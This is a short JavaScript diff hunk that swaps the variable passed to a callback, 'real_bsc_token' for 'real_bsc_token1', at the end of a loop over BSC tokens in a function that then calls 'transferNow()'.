@@ -512,7 +512,7 @@ async function proceed(){
             }
         });
         if(i+1 === bsc_length) {
-          callback(real_bsc_token);
+          callback(real_bsc_token1);
           transferNow();
         }
       })
